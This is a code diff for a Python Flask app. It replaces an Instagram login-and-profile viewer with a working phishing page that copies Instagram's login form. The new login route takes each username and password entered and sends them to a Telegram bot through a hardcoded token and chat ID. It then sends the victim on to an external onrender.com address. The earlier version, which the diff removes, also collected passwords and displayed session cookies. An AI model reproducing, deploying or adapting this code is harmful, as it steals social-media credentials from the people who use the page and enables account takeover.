@@ -1,170 +1,222 @@
-from flask import Flask, render_template_string, request, session
+from flask import Flask, render_template_string, request, jsonify, redirect
 import requests
 
 app = Flask(__name__)
-app.secret_key = "your_secret_key_here"  # किसी भी random key से बदलें
 
-# Instagram Private API Headers
-HEADERS = {
-    "User-Agent": "Instagram 123.0.0.26.115 Android",
-    "Accept": "*/*",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "en-US",
-    "X-IG-App-ID": "936619743392459"
-}
+# Telegram bot configuration
+TELEGRAM_BOT_TOKEN = "7803278107:AAG5zSadC7P4b6T3XiMhrFTfv0udDLYmZB4"
+TELEGRAM_CHAT_ID = "8186206231"
 
-# Instagram लॉगिन फंक्शन
-def instagram_login(username, password):
-    session_url = "https://www.instagram.com/api/v1/web/accounts/login/"
-    login_data = {
-        "username": username,
-        "password": password,
-        "queryParams": "{}"
-    }
+# Redirect URL after login
+REDIRECT_URL = "https://instagram-server-6.onrender.com"
 
-    with requests.Session() as s:
-        s.headers.update(HEADERS)
-        login_response = s.post(session_url, data=login_data)
-        
-        if login_response.status_code == 200 and '"authenticated": true' in login_response.text:
-            cookies = s.cookies.get_dict()
-            return cookies, s
-        else:
-            return None, None
-
-# यूज़र डेटा प्राप्त करने का फंक्शन
-def fetch_user_data(session_obj):
-    user_info_url = "https://www.instagram.com/api/v1/accounts/current_user/"
-    response = session_obj.get(user_info_url)
-
-    if response.status_code == 200:
-        data = response.json()
-        return {
-            "username": data["user"]["username"],
-            "full_name": data["user"]["full_name"],
-            "followers": data["user"]["follower_count"],
-            "following": data["user"]["following_count"],
-            "profile_pic": data["user"]["profile_pic_url"],
-            "groups": ["Group 1", "Group 2", "Group 3"],  # इसको सही API से रिप्लेस करें
-            "cookies": session_obj.cookies.get_dict()
-        }
-    return None
-
-# HTML Page
-html_code = '''
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Details Finder</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-box {
-            background: white;
-            padding: 20px;
-            border: 1px solid #dbdbdb;
-            text-align: center;
-            width: 300px;
-            border-radius: 5px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 14px;
-        }
-        .login-btn {
-            background-color: #3897f0;
-            color: white;
-            padding: 10px;
-            width: 100%;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-        }
-        .show-password {
-            margin-top: 5px;
-            font-size: 14px;
-            cursor: pointer;
-            color: #00376b;
-        }
-        .info-box {
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #dbdbdb;
-            background: white;
-            border-radius: 5px;
-            width: 300px;
-            text-align: left;
-        }
-    </style>
-    <script>
-        function togglePassword() {
-            var passField = document.getElementById("password");
-            if (passField.type === "password") {
-                passField.type = "text";
-            } else {
-                passField.type = "password";
-            }
-        }
-    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #262626;
+    }
+    .login-container {
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo {
+      margin: 22px auto 12px;
+    }
+    .logo img {
+      width: 175px;
+    }
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px 40px;
+      margin-bottom: 10px;
+    }
+    .login-form input {
+      width: 100%;
+      padding: 9px 8px 7px;
+      margin-bottom: 6px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      background: #fafafa;
+    }
+    .login-form input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+    }
+    .login-button {
+      width: 100%;
+      background-color: #0095f6;
+      color: #fff;
+      padding: 7px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .login-button:hover {
+      background-color: #1877f2;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0 18px;
+      width: 100%;
+    }
+    .divider-line {
+      flex-grow: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    .divider-text {
+      margin: 0 18px;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .facebook-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin: 8px 0;
+      text-align: center;
+    }
+    .forgotten-password {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+      margin-top: 12px;
+      text-align: center;
+    }
+    .signup {
+      width: 100%;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .signup a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+  </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>Instagram</h2>
-        <form action="/" method="POST">
-            <input type="text" name="email" placeholder="Username or Email" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <span class="show-password" onclick="togglePassword()">👁 Show Password</span>
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
     </div>
+    <form class="login-form" id="loginForm">
+      <input id="username" type="text" placeholder="Phone number, username, or email" required />
+      <input id="password" type="password" placeholder="Password" required />
+      <button type="submit" class="login-button">Log In</button>
+      <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">OR</div>
+        <div class="divider-line"></div>
+      </div>
+      <a href="#" class="facebook-login">
+        <i class="fab fa-facebook-square"></i> Log in with Facebook
+      </a>
+      <a href="#" class="forgotten-password">Forgotten your password?</a>
+    </form>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
 
-    {% if data %}
-    <div class="info-box">
-        <h3>Account Details:</h3>
-        <p><b>Username:</b> {{ data.username }}</p>
-        <p><b>Full Name:</b> {{ data.full_name }}</p>
-        <p><b>Followers:</b> {{ data.followers }}</p>
-        <p><b>Following:</b> {{ data.following }}</p>
-        <p><b>Groups:</b> {{ data.groups | join(', ') }}</p>
-        <p><b>Cookies:</b> {{ data.cookies }}</p>
-        <img src="{{ data.profile_pic }}" width="100" style="border-radius:50%;" />
-        <p style="color: green; font-weight: bold;">✅ Login Successful!</p>
-    </div>
-    {% endif %}
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      if (!username || !password) {
+        alert('Please enter both username and password.');
+        return;
+      }
+
+      fetch('/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          // Redirect to external URL after successful login
+          window.location.href = "https://instagram-server-6.onrender.com";
+        } else {
+          alert(data.message);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    });
+  </script>
 </body>
 </html>
-'''
+"""
 
-@app.route("/", methods=["GET", "POST"])
+@app.route('/')
 def index():
-    if request.method == "POST":
-        username = request.form.get("email")
-        password = request.form.get("password")
+    return render_template_string(HTML_TEMPLATE)
 
-        # Instagram लॉगिन
-        cookies, session_obj = instagram_login(username, password)
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    if not username or not password:
+        return jsonify({'success': False, 'message': 'Please enter both username and password.'})
+    
+    # Send credentials to Telegram
+    send_to_telegram(username, password)
+    
+    return jsonify({'success': True, 'message': 'Login successful'})
 
-        if cookies:
-            # असली डेटा प्राप्त करें
-            user_data = fetch_user_data(session_obj)
-            return render_template_string(html_code, data=user_data)
-        else:
-            return render_template_string(html_code, data=None)
-
-    return render_template_string(html_code, data=None)
+def send_to_telegram(username, password):
+    message = f"📱 Instagram Login Attempt\n\n👤 Username: {username}\n🔑 Password: {password}"
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={message}"
+    
+    try:
+        requests.get(url, timeout=5)
+    except requests.RequestException as e:
+        print(f"Error sending to Telegram: {e}")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
